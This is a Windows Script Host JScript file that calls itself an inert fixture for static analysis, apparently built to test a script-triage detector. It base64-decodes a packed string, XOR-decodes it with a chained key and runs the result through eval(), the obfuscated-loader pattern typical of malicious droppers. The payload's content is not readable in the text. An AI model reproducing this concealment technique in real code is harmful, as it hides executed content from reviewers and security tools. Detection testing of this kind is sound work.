// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
function decode_3cf7ab48(v_a19c) {
  var v_b27e = [];
  var previous = 60;
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push(v_a19c[i] ^ previous); previous = v_a19c[i]; }
  return v_b27e;
}
function recover_8fa3a069() {
  if (true) {
    var packedText = "R2UWYgd3BCYcR2UJZgVkEHUqRilKK0dlSWsbaQx8HW8KVSFTMlwvSSxefFByB3cbdBVxLlw5VDtPKghVeVs6Xj9PO14sDjQWVTpUMls8bwp" + "pHG4HcwpaNVkwUyoEYRl8XnJQJkcrXjtIalArCWoLZhZ3HnkXSCFFZ11/HH0QYAFoD2FMeU19GS0YKkx8TmxAYhdlCSsRM1svWytYYk1iV2" + "NTNwM2BGJSYE4rUzJfL0MmCGEPeRh0HXlWMwRnUWQGNg4gRCVRc199CHsebDNSNVA+SmhScDhNI1clQDNADG0PIBUhEXVBdEYgECIALA5oA" + "W0IVydGMlp4QmAjGUUZTD9aKFsHWwt+HHAZeiZ6MkcpXS9KOUoGZwVZBXYCYwRhTHlNfRktGCpMfE5gBGURM05iQDNHJkEkZwh9E2dFf0wx";
    var v_a19c = decodeBase64(packedText);
    var v_f602 = (2 > 1) ? "left" : "right";
    var invoke = function(block, value) { return block.call(null, value); };
    var v_b27e = invoke.call(null, decode_3cf7ab48, v_a19c);
    var v_c304;
    v_c304 = v_b27e.length ? String.fromCharCode(v_b27e[0]) : "";
    for (var bi = 1; bi < v_b27e.length; bi++) { v_c304 = v_c304.concat(String.fromCharCode(v_b27e[bi])); }
    return v_c304;
  }
}
function inspect_81b5c73d() {
  var v_d41a = eval("(" + recover_8fa3a069.call(null) + ")");
  var table = { steps: function() { return v_d41a.steps; }, values: function() { return v_d41a.values; } };
  return { steps: table.steps.call(null), adapter: v_d41a["adapter"], values: table["values"].call(null), stageCount: v_d41a["stageCount"] };
}
